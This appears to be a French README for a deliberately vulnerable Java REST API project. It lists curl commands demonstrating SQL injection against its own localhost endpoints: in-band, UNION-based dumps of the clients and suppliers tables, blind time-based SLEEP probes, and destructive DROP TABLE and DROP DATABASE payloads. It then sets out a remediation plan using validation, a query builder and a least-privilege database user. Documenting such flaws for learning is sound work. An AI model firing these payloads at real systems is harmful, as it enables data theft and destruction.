# Décision de conception

J'ai pris les décisions de conception suivantes pour les raisons suivantes :

Pas de framework : J'ai décidé de ne pas utiliser de framework pour rendre le code plus sécurisé contre les menaces provenant de bibliothèques externes.
Migration Flyway
Maven
Jackson
Docker-compose
Lombok
Rest-Assured
JUnit

---

# Failles

Toutes mes routes API présentent des vulnérabilités aux injections SQL. On peut le constater en exécutant les commandes ci-dessous. Ces vulnérabilités sont particulièrement visibles sur les routes getId, car elles renvoient directement le résultat des requêtes SQL, tandis que les autres endpoints affichent seulement un message.

## Commandes SQL in-band :

```bash
curl "http://localhost:3000/api/orders/1'OR'1'='1'; -- "
curl -X GET "http://localhost:3000/api/products/1';DROP TABLE product*suppliers;--"
curl -X GET "http://localhost:3000/api/products/1';DROP DATABASE airPapier;--"
```

## Commandes SQL par Union (les tables doivent avoir le même nombre de colonnes) :

```bash
curl "http://localhost:3000/api/products/1' OR '1'='1' UNION SELECT * FROM clients; -- "
curl "http://localhost:3000/api/orders/1' OR '1'='1' UNION SELECT \_ FROM suppliers; -- "
```

## Commandes SQL aveugles (Inferential) :

```bash
curl -X GET "http://localhost:3000/api/categories/1'OR IF(1=1, SLEEP(5), NULL); -- "
curl -X GET "http://localhost:3000/api/categories/1'OR IF(1=1, 'True', 'False'); -- "
```

## Autres Failles:

- Aucune validation des champs : Les modèles, disponibles dans le dossier air-papier/src/main/java/com/airpapier/model, n'ont aucune validation sur leurs champs.
- Handlers non sécurisés : Les méthodes du handler retournent actuellement une List<Map<String, Object>> au lieu d'un objet modèle. Cela signifie que toutes les données sont renvoyées au lieu des champs nécessaires uniquement.
- Problème avec l'utilisateur de la base de données : Actuellement, l'application utilise l'utilisateur root pour accéder à la base de données. Cela n'est pas sûr. Nous devrions utiliser un utilisateur avec des droits limités (lecture/écriture) et sans permission de supprimer la base.

---

# Changements prévus pour la version V2

L'application actuelle n'est ni sécurisée ni capable de gérer correctement les erreurs. Voici les étapes que nous prendrons pour résoudre ces problèmes dans la version 2 :

- Ajouter le validateur Hibernate

  - Pour valider chaque champ des modèles et retourner un message d'erreur clair si un champ est manquant ou invalide.

- Utiliser un Query-Builder (JOOQ)

  - Cela permet d'éviter les vulnérabilités liées aux injections SQL tout en offrant une meilleure flexibilité qu'un ORM classique.

- Retourner un objet au lieu d'une liste

  - Cela garantit que seules les données nécessaires d'un modèle sont renvoyées, rendant les réponses plus propres et plus sécurisées.

- Changer d'utilisateur pour la base de données

  - Utiliser un utilisateur avec des droits limités pour réduire les risques en cas de faille.

- Ajouter une gestion des erreurs dans les handlers
  - Pour garantir que l'application renvoie des messages d'erreur clairs en cas de problème et ne divulgue pas d'informations sensibles.
